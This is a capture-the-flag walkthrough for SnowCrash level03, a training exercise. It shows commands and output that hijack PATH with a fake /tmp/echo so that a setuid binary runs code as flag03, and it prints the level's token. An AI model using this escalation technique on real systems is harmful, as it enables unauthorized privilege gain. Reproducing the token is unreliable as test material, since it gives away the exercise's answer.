Level03 instructions

On the home directory we have a binary file `level03`, executed with the permission of the owner `flag03`
```
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*
```
executing the file give nothing
```
level03@SnowCrash:~$ ./level03
Exploit me
level03@SnowCrash:~$ ./level03 hh
Exploit me
```

Analyzing Binaries
Tools to examine and reverse-engineer binaries:

- file: Identifies the type of file (e.g., ELF executable, shared object).
- strings: Extracts readable strings from a binary, often useful for finding hints.
- readelf: Displays information about ELF headers, sections, symbols, etc.
- objdump: Disassembles binary code and provides detailed analysis.
- nm: Lists symbols (functions, variables) in an object file or binary.
- ltrace: Traces library calls made by a binary during execution.
- strace: Tracks system calls made by a binary.

Let's try to analyze it with `ltrace`
```
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7c4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                 = 2003
geteuid()                                                                                 = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                       = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                       = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                    = 0
+++ exited (status 0) +++
level03@SnowCrash:~$
```
On the system call we have env command that run a program in a modified environment, means prepare the environment before running the command. as we notice on the command echo, there is no slashes, means it will use $PATH from the environment to search for the command.
We can use that to change default echo to our vulnerable echo by putting our path in the beginning of $PATH
We will use the /tmp folder since we don't have the right to write else where

```
level03@SnowCrash:~$ echo id > /tmp/echo
level03@SnowCrash:~$ chmod +x /tmp/echo
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03
uid=3003(flag03) gid=2003(level03) groups=3003(flag03),100(users),2003(level03)
```
Since we are sure that the command on `/tmp/echo` will run as `flag03` we can now replace `id` with `getflag` to get the token for the next level.
```
level03@SnowCrash:~$ echo getflag > /tmp/echo
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$
level03@SnowCrash:~$ su level04
Password:
level04@SnowCrash:~$
```
